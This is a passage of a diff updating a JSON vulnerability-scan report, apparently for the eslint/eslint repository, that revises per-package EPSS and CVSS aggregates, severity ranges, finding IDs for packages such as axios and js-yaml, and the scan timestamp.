+          "max_epss_percentile": 0.37902,
           "max_cvss_score": 8.1,
           "severity_min": "high",
           "severity_max": "medium",
@@ -23236,7 +22806,7 @@
         ],
         "aggregates": {
           "max_epss_score": 0.04087,
-          "max_epss_percentile": 0.89402,
+          "max_epss_percentile": 0.89613,
           "max_cvss_score": 9.8,
           "severity_min": "critical",
           "severity_max": "medium",
@@ -23254,7 +22824,7 @@
         ],
         "aggregates": {
           "max_epss_score": 0.00337,
-          "max_epss_percentile": 0.25372,
+          "max_epss_percentile": 0.25971,
           "max_cvss_score": 7.5,
           "severity_min": "high",
           "severity_max": "high",
@@ -23266,6 +22836,7 @@
       {
         "package": "axios",
         "finding_ids": [
+          "02c01841a9b40ae7",
           "0ed2701093142cf8",
           "2ed981a55440532a",
           "3b725689a0b78a02",
@@ -23285,16 +22856,17 @@
           "b9e39b63ff45fb0b",
           "c2d73f6e77eef6b2",
           "d193530a4fa0eb5e",
+          "dd74ad56f4b24dd6",
           "e80b9ad334cae860",
           "f2a0986868a31e96"
         ],
-        "finding_count": 21,
+        "finding_count": 23,
         "candidate_ids": [
-          "3dcdde8aefb71b50"
+          "cd24d099957f01d8"
         ],
         "aggregates": {
-          "max_epss_score": 0.01242,
-          "max_epss_percentile": 0.65367,
+          "max_epss_score": 0.025,
+          "max_epss_percentile": 0.82956,
           "max_cvss_score": 8.6,
           "severity_min": "high",
           "severity_max": "low",
@@ -23312,7 +22884,7 @@
         ],
         "aggregates": {
           "max_epss_score": 0.00873,
-          "max_epss_percentile": 0.542,
+          "max_epss_percentile": 0.54958,
           "max_cvss_score": 7.5,
           "severity_min": "high",
           "severity_max": "high",
@@ -23329,8 +22901,8 @@
           "60f49c8094941b8c"
         ],
         "aggregates": {
-          "max_epss_score": 0.00512,
-          "max_epss_percentile": 0.39551,
+          "max_epss_score": 0.00562,
+          "max_epss_percentile": 0.43092,
           "max_cvss_score": 2.5,
           "severity_min": "low",
           "severity_max": "low",
@@ -23346,7 +22918,7 @@
         "candidate_ids": [],
         "aggregates": {
           "max_epss_score": 0.00161,
-          "max_epss_percentile": 0.05604,
+          "max_epss_percentile": 0.05706,
           "max_cvss_score": 5.6,
           "severity_min": "medium",
           "severity_max": "medium",
@@ -23356,19 +22928,18 @@
       {
         "package": "js-yaml",
         "finding_ids": [
-          "4db22f51326cf321",
-          "538452b62c34fbd9"
+          "538452b62c34fbd9",
+          "a0f8ede85ca16b5d"
         ],
         "finding_count": 2,
         "candidate_ids": [
-          "c8883580e853cdcc",
-          "f5514b38e46302bc"
+          "c85b1dfa6892a9d2"
         ],
         "aggregates": {
-          "max_epss_score": 0.00251,
-          "max_epss_percentile": 0.1618,
-          "max_cvss_score": 5.3,
-          "severity_min": "medium",
+          "max_epss_score": 0.0037,
+          "max_epss_percentile": 0.29385,
+          "max_cvss_score": 7.5,
+          "severity_min": "high",
           "severity_max": "medium",
           "has_kev": false
         }
@@ -23388,8 +22959,8 @@
           "e2b71f42a38c98a4"
         ],
         "aggregates": {
-          "max_epss_score": 0.01026,
-          "max_epss_percentile": 0.59101,
+          "max_epss_score": 0.2241,
+          "max_epss_percentile": 0.97438,
           "max_cvss_score": 8.1,
           "severity_min": "high",
           "severity_max": "medium",
@@ -23405,7 +22976,7 @@
         "candidate_ids": [],
         "aggregates": {
           "max_epss_score": 0.05213,
-          "max_epss_percentile": 0.91415,
+          "max_epss_percentile": 0.91599,
           "max_cvss_score": 7.4,
           "severity_min": "high",
           "severity_max": "high",
@@ -23422,8 +22993,8 @@
           "4a3cbdd638c1b6ec"
         ],
         "aggregates": {
-          "max_epss_score": 0.00252,
-          "max_epss_percentile": 0.16294,
+          "max_epss_score": 0.00306,
+          "max_epss_percentile": 0.22649,
           "max_cvss_score": 5.3,
           "severity_min": "medium",
           "severity_max": "medium",
@@ -23440,8 +23011,8 @@
           "ee321bb45e8ad56b"
         ],
         "aggregates": {
-          "max_epss_score": 0.02014,
-          "max_epss_percentile": 0.78362,
+          "max_epss_score": 0.02165,
+          "max_epss_percentile": 0.80262,
           "max_cvss_score": 7.5,
           "severity_min": "high",
           "severity_max": "high",
@@ -23459,7 +23030,7 @@
         ],
         "aggregates": {
           "max_epss_score": 0.00351,
-          "max_epss_percentile": 0.26831,
+          "max_epss_percentile": 0.27435,
           "max_cvss_score": 5.3,
           "severity_min": "medium",
           "severity_max": "medium",
@@ -23478,7 +23049,7 @@
         ],
         "aggregates": {
           "max_epss_score": 0.00472,
-          "max_epss_percentile": 0.37158,
+          "max_epss_percentile": 0.37902,
           "max_cvss_score": 8.1,
           "severity_min": "high",
           "severity_max": "medium",
@@ -23497,7 +23068,7 @@
         ],
         "aggregates": {
           "max_epss_score": 0.04087,
-          "max_epss_percentile": 0.89402,
+          "max_epss_percentile": 0.89613,
           "max_cvss_score": 9.8,
           "severity_min": "critical",
           "severity_max": "medium",
@@ -23515,7 +23086,7 @@
         ],
         "aggregates": {
           "max_epss_score": 0.00337,
-          "max_epss_percentile": 0.25372,
+          "max_epss_percentile": 0.25971,
           "max_cvss_score": 7.5,
           "severity_min": "high",
           "severity_max": "high",
@@ -23532,10 +23103,10 @@
     "repo_display": "eslint/eslint",
     "ref": "main",
     "mode": "A",
-    "completed_at": "2026-06-24T06:42:04.602147+00:00",
+    "completed_at": "2026-07-21T17:19:18.150244+00:00",
     "dep_counts": {
       "direct": 126,
-      "transitive": 1096
+      "transitive": 1095
     }
   }
 }
